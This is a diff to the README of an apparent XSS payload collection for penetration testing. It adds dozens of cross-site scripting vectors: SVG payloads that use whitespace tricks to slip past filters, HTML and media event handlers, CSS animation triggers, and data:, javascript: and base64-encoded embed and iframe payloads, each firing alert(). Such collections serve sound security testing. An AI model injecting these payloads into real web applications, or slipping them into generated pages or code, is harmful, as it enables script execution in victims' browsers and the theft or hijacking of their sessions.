@@ -1,6 +1,60 @@
 # XSS-Payloads
 XSS Payloads collection for testing web application during an engagement 
 
+## Payloads for 2020 - Some updates
+Extracted from https://netsec.expert/2020/02/01/xss-in-2020.html (Awesome work)
+*SVG*
+```javascript
+<svg/onload=alert(1)><svg>
+<svg
+onload=alert(1)><svg> # newline char
+<svg	onload=alert(1)><svg> # tab char
+<svgonload=alert(1)><svg> # new page char (0xc)
+```
+*Standard HTML events*
+```javascript
+<body onload=alert()>
+<img src=x onerror=alert()>
+<svg onload=alert()>
+<body onpageshow=alert(1)>
+<div style="width:1000px;height:1000px" onmouseover=alert()></div>
+<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)
+<marquee onstart=alert(1)> (firefox only)
+<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)
+<input autofocus="" onfocus=alert(1)></input>
+<details open ontoggle="alert()">  (chrome & opera only)
+```
+*Standard HTML events - Video load*
+```javascript
+<video autoplay onloadstart="alert()" src=x></video>
+<video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
+<video controls onloadeddata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
+<video controls onloadedmetadata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
+<video controls onloadstart="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
+<video controls onloadstart="alert()"><source src=x></video>
+<video controls oncanplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>
+<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
+<audio autoplay controls onplaying="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
+```
+*CSS-based events*
+```javascript
+<style>@keyframes x {}</style>
+<p style="animation: x;" onanimationstart="alert()">XSS</p>
+<p style="animation: x;" onanimationend="alert()">XSS</p>
+```
+*Weird XSS vectors*
+```javascript
+<svg><animate onbegin=alert() attributeName=x></svg>
+<object data="data:text/html,<script>alert(5)</script>">
+<iframe srcdoc="<svg onload=alert(4);>">
+<object data=javascript:alert(3)>
+<iframe src=javascript:alert(2)>
+<embed src=javascript:alert(1)>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
+<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
+```
+
+
 ---
 ```javascript
 By MrPapercut 
